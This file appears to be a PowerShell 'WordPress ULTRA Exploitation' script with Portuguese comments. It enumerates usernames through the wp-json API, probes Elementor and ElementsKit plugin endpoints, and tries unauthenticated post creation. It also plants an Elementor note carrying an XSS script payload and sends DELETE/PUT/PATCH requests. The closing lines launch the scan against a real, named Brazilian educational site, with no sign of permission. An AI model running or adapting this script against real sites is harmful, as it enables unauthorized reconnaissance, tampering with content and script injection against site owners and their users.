# WordPress ULTRA Exploitation Toolkit
# Scanner COMPLETO para wp-json exposto

function Invoke-WordPressUltraScan {
    param([string]$BaseUrl)
    
    Write-Host "`n" + "="*80 -ForegroundColor Red
    Write-Host "WORDPRESS ULTRA EXPLOITATION SCANNER" -ForegroundColor Red
    Write-Host "Target: $BaseUrl" -ForegroundColor Yellow
    Write-Host "="*80 -ForegroundColor Red
    
    $apiUrl = "$BaseUrl/wp-json"
    $allData = @()
    $vulnerabilities = @()
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $reportFile = "wordpress_ultra_scan_$timestamp.txt"
    
    # Inicializa relatório
    $reportContent = @()
    $reportContent += "="*80
    $reportContent += "WORDPRESS ULTRA EXPLOITATION REPORT"
    $reportContent += "Target: $BaseUrl"
    $reportContent += "Scan Date: $(Get-Date)"
    $reportContent += "="*80
    $reportContent += ""
    
    # 1. EXTRAÇÃO MÁXIMA DE DADOS
    Write-Host "`n[1] MASS DATA EXTRACTION" -ForegroundColor Red
    $reportContent += "[1] MASS DATA EXTRACTION"
    
    # Users - O mais crítico!
    try {
        $users = Invoke-RestMethod -Uri "$apiUrl/wp/v2/users" -TimeoutSec 10
        Write-Host "  [SUCCESS] USER ENUMERATION: $($users.Count) users found!" -ForegroundColor Green
        $reportContent += "  USER ENUMERATION: $($users.Count) users found!"
        
        foreach ($user in $users) {
            Write-Host "     USER: $($user.name) (ID: $($user.id))" -ForegroundColor Cyan
            Write-Host "        Username: $($user.slug)" -ForegroundColor Gray
            Write-Host "        Profile: $($user.link)" -ForegroundColor Gray
            if ($user.description) { Write-Host "        Bio: $($user.description)" -ForegroundColor DarkGray }
            
            $reportContent += "     - $($user.name) (ID: $($user.id))"
            $reportContent += "        Username: $($user.slug)"
            $reportContent += "        Profile: $($user.link)"
            if ($user.description) { $reportContent += "        Bio: $($user.description)" }
            
            $vulnerabilities += "USER_ENUMERATION: $($user.slug) - $($user.link)"
        }
        $reportContent += ""
    } catch { 
        Write-Host "  [BLOCKED] Users endpoint" -ForegroundColor Red
        $reportContent += "  Users endpoint: BLOCKED"
    }
    
    # Posts com conteúdo completo
    try {
        $posts = Invoke-RestMethod -Uri "$apiUrl/wp/v2/posts?per_page=50&_fields=id,title,content,author,date,status,link" -TimeoutSec 10
        Write-Host "  [SUCCESS] POSTS: $($posts.Count) posts with full content!" -ForegroundColor Green
        $reportContent += "  POSTS: $($posts.Count) posts with full content!"
        
        foreach ($post in $posts | Select-Object -First 5) {
            $cleanContent = $post.content.rendered -replace '<[^>]+>', '' -replace '\s+', ' '
            $preview = if ($cleanContent.Length -gt 100) { $cleanContent.Substring(0, 100) + "..." } else { $cleanContent }
            
            Write-Host "     POST: $($post.title.rendered)" -ForegroundColor White
            Write-Host "        ID: $($post.id) | Author: $($post.author) | Status: $($post.status)" -ForegroundColor Gray
            Write-Host "        URL: $($post.link)" -ForegroundColor Gray
            Write-Host "        Preview: $preview" -ForegroundColor DarkGray
            
            $reportContent += "     - $($post.title.rendered)"
            $reportContent += "        ID: $($post.id) | Author: $($post.author) | Status: $($post.status)"
            $reportContent += "        URL: $($post.link)"
            $reportContent += "        Preview: $preview"
        }
        $reportContent += ""
    } catch { 
        Write-Host "  [BLOCKED] Posts endpoint" -ForegroundColor Red
        $reportContent += "  Posts endpoint: BLOCKED"
    }
    
    # 2. EXPLORAÇÃO DE PLUGINS
    Write-Host "`n[2] PLUGIN EXPLOITATION" -ForegroundColor Red
    $reportContent += "[2] PLUGIN EXPLOITATION"
    
    # Elementor - MUITO CRÍTICO
    $elementorEndpoints = @(
        "/elementor/v1/notes",
        "/elementor/v1/notes/1", 
        "/elementor/v1/notes/summary",
        "/elementor/v1/notes/users",
        "/elementor/v1/send-event"
    )
    
    foreach ($endpoint in $elementorEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$apiUrl$endpoint" -TimeoutSec 5
            if ($response.StatusCode -eq 200) {
                Write-Host "  [VULNERABLE] Elementor: $endpoint - PUBLIC ACCESS!" -ForegroundColor Red
                $reportContent += "  [VULNERABLE] Elementor: $endpoint - PUBLIC ACCESS!"
                $vulnerabilities += "ELEMENTOR_EXPOSED: $endpoint"
                
                # Tenta extrair dados
                try {
                    $data = $response.Content | ConvertFrom-Json
                    Write-Host "        Data accessible: $($data.Count) items" -ForegroundColor Yellow
                    $reportContent += "        Data accessible: $($data.Count) items"
                } catch {
                    Write-Host "        Could not parse data" -ForegroundColor Gray
                }
            }
        } catch {
            Write-Host "  [SECURE] Elementor: $endpoint - blocked" -ForegroundColor Green
        }
    }
    
    # ElementsKit - Outro plugin crítico
    $elementskitEndpoints = @(
        "/elementskit/v1/widget/mailchimp",
        "/elementskit/v1/dynamic-content",
        "/elementskit/v1/layout-manager-api", 
        "/elementskit/v1/my-template",
        "/elementskit/v1/megamenu",
        "/elementskit/v1/widget-builder"
    )
    
    foreach ($endpoint in $elementskitEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$apiUrl$endpoint" -TimeoutSec 5
            if ($response.StatusCode -eq 200) {
                Write-Host "  [VULNERABLE] ElementsKit: $endpoint - PUBLIC ACCESS!" -ForegroundColor Red
                $reportContent += "  [VULNERABLE] ElementsKit: $endpoint - PUBLIC ACCESS!"
                $vulnerabilities += "ELEMENTSKIT_EXPOSED: $endpoint"
            }
        } catch {
            # Silencioso para endpoints bloqueados
        }
    }
    $reportContent += ""
    
    # 3. TENTATIVAS DE ELEVAÇÃO DE PRIVILÉGIOS
    Write-Host "`n[3] PRIVILEGE ESCALATION ATTEMPTS" -ForegroundColor Red
    $reportContent += "[3] PRIVILEGE ESCALATION ATTEMPTS"
    
    # Tenta criar um post
    try {
        $testPost = @{
            title = "Security Test - $(Get-Date -Format 'yyyyMMdd_HHmmss')"
            content = "This is a security test post created during penetration testing"
            status = "draft"
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri "$apiUrl/wp/v2/posts" -Method POST -Body $testPost -ContentType "application/json" -TimeoutSec 5
        
        if ($response.StatusCode -eq 201) {
            Write-Host "  [CRITICAL] POST CREATION SUCCESSFUL! Unauthorized access!" -ForegroundColor Red
            $reportContent += "  [CRITICAL] POST CREATION SUCCESSFUL! Unauthorized access!"
            $vulnerabilities += "UNAUTHORIZED_POST_CREATION: Can create posts without authentication"
            
            # Extrai dados do post criado
            $postData = $response.Content | ConvertFrom-Json
            Write-Host "        Post ID: $($postData.id)" -ForegroundColor Yellow
            Write-Host "        Post URL: $($postData.link)" -ForegroundColor Yellow
            $reportContent += "        Post ID: $($postData.id)"
            $reportContent += "        Post URL: $($postData.link)"
            
            # Limpeza - tenta deletar
            try {
                Invoke-WebRequest -Uri "$apiUrl/wp/v2/posts/$($postData.id)" -Method DELETE -TimeoutSec 3
                Write-Host "        Test post deleted" -ForegroundColor Green
                $reportContent += "        Test post deleted"
            } catch {
                Write-Host "        Could not delete test post" -ForegroundColor Yellow
                $reportContent += "        Could not delete test post"
            }
        }
    } catch {
        Write-Host "  [SECURE] Post creation blocked" -ForegroundColor Green
        $reportContent += "  Post creation: BLOCKED"
    }
    
    # Tenta criar uma nota no Elementor
    try {
        $testNote = @{
            content = "Security test note - XSS test: <script>alert('XSS')</script>"
            position = @{ x = 100; y = 100 }
            route_url = $BaseUrl
            route_title = "Security Test"
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri "$apiUrl/elementor/v1/notes" -Method POST -Body $testNote -ContentType "application/json" -TimeoutSec 5
        
        if ($response.StatusCode -eq 201) {
            Write-Host "  [CRITICAL] ELEMENTOR NOTE CREATION SUCCESSFUL!" -ForegroundColor Red
            $reportContent += "  [CRITICAL] ELEMENTOR NOTE CREATION SUCCESSFUL!"
            $vulnerabilities += "ELEMENTOR_UNAUTHORIZED_ACCESS: Can create notes without authentication"
            
            $noteData = $response.Content | ConvertFrom-Json
            Write-Host "        Note ID: $($noteData.id)" -ForegroundColor Yellow
            $reportContent += "        Note ID: $($noteData.id)"
        }
    } catch {
        Write-Host "  [SECURE] Elementor note creation blocked" -ForegroundColor Green
        $reportContent += "  Elementor note creation: BLOCKED"
    }
    $reportContent += ""
    
    # 4. FUZZING DE ENDPOINTS OCULTOS
    Write-Host "`n[4] HIDDEN ENDPOINTS FUZZING" -ForegroundColor Red
    $reportContent += "[4] HIDDEN ENDPOINTS FUZZING"
    
    $fuzzPatterns = @(
        "/wp/v2/users/1", "/wp/v2/users/2", "/wp/v2/users/3",
        "/wp/v2/posts/1", "/wp/v2/posts/2", "/wp/v2/posts/3",
        "/wp/v2/pages/1", "/wp/v2/pages/2", 
        "/wp/v2/comments/1", "/wp/v2/comments/2",
        "/wp/v2/media/1", "/wp/v2/media/2",
        "/wp/v2/settings", "/wp/v2/taxonomies", "/wp/v2/types",
        "/wp/v2/statuses", "/wp/v2/categories", "/wp/v2/tags"
    )
    
    $foundEndpoints = @()
    foreach ($pattern in $fuzzPatterns) {
        try {
            $response = Invoke-WebRequest -Uri "$apiUrl$pattern" -TimeoutSec 3
            if ($response.StatusCode -eq 200) {
                Write-Host "  [FOUND] $pattern" -ForegroundColor Green
                $reportContent += "  [FOUND] $pattern"
                $foundEndpoints += $pattern
            }
        } catch {
            # Silencioso para endpoints não encontrados
        }
    }
    $reportContent += ""
    
    # 5. TESTE DE MÉTODOS HTTP PERIGOSOS
    Write-Host "`n[5] DANGEROUS HTTP METHODS TEST" -ForegroundColor Red
    $reportContent += "[5] DANGEROUS HTTP METHODS TEST"
    
    $testEndpoints = @("$apiUrl/wp/v2/posts", "$apiUrl/wp/v2/users", "$apiUrl/elementor/v1/notes")
    $dangerousMethods = @("POST", "PUT", "DELETE", "PATCH")
    
    foreach ($testEndpoint in $testEndpoints) {
        $endpointName = $testEndpoint.Replace($apiUrl, '')
        Write-Host "  Testing: $endpointName" -ForegroundColor Gray
        $reportContent += "  Testing: $endpointName"
        
        foreach ($method in $dangerousMethods) {
            try {
                $response = Invoke-WebRequest -Uri $testEndpoint -Method $method -TimeoutSec 5
                Write-Host "    $method - ALLOWED ($($response.StatusCode))" -ForegroundColor Red
                $reportContent += "    $method - ALLOWED ($($response.StatusCode))"
                $vulnerabilities += "DANGEROUS_METHOD_ALLOWED: $endpointName - $method"
            } catch [System.Net.WebException] {
                $statusCode = $_.Exception.Response.StatusCode.value__
                Write-Host "    $method - DENIED ($statusCode)" -ForegroundColor Green
                $reportContent += "    $method - DENIED ($statusCode)"
            } catch {
                Write-Host "    $method - ERROR" -ForegroundColor Yellow
                $reportContent += "    $method - ERROR"
            }
        }
        $reportContent += ""
    }
    
    # 6. RELATÓRIO FINAL E VULNERABILIDADES
    Write-Host "`n" + "="*80 -ForegroundColor Red
    Write-Host "SCAN COMPLETE - VULNERABILITY SUMMARY" -ForegroundColor Red
    Write-Host "="*80 -ForegroundColor Red
    
    $reportContent += "="*80
    $reportContent += "SCAN COMPLETE - VULNERABILITY SUMMARY"
    $reportContent += "="*80
    $reportContent += ""
    
    if ($vulnerabilities.Count -gt 0) {
        Write-Host "CRITICAL VULNERABILITIES FOUND: $($vulnerabilities.Count)" -ForegroundColor Red
        $reportContent += "CRITICAL VULNERABILITIES FOUND: $($vulnerabilities.Count)"
        
        foreach ($vuln in $vulnerabilities) {
            Write-Host "  [!] $vuln" -ForegroundColor Red
            $reportContent += "  [!] $vuln"
        }
        
        Write-Host "`nRECOMMENDATIONS:" -ForegroundColor Yellow
        Write-Host "  - Restrict WordPress REST API access" -ForegroundColor White
        Write-Host "  - Implement proper authentication" -ForegroundColor White
        Write-Host "  - Review plugin permissions" -ForegroundColor White
        Write-Host "  - Disable unused endpoints" -ForegroundColor White
        
        $reportContent += ""
        $reportContent += "RECOMMENDATIONS:"
        $reportContent += "  - Restrict WordPress REST API access"
        $reportContent += "  - Implement proper authentication" 
        $reportContent += "  - Review plugin permissions"
        $reportContent += "  - Disable unused endpoints"
    } else {
        Write-Host "No critical vulnerabilities found" -ForegroundColor Green
        $reportContent += "No critical vulnerabilities found"
    }
    
    # Salva relatório completo
    $reportContent | Out-File -FilePath $reportFile -Encoding UTF8
    Write-Host "`nFull report saved to: $reportFile" -ForegroundColor Green
    
    return $vulnerabilities
}

# Função para scan rápido
function Start-QuickWordPressScan {
    param([string]$Url)
    
    if (-not $Url.StartsWith('http')) {
        $Url = "https://$Url"
    }
    
    Write-Host "Starting ULTRA scan of: $Url" -ForegroundColor Yellow
    Invoke-WordPressUltraScan -BaseUrl $Url
}

# Exemplos de uso:
Start-QuickWordPressScan "https://iesgo.edu.br"
Invoke-WordPressUltraScan "https://iesgo.edu.br"

Write-Host "WordPress ULTRA Exploitation Scanner loaded!" -ForegroundColor Green
Write-Host "Use: Start-QuickWordPressScan 'https://target.com'" -ForegroundColor Yellow
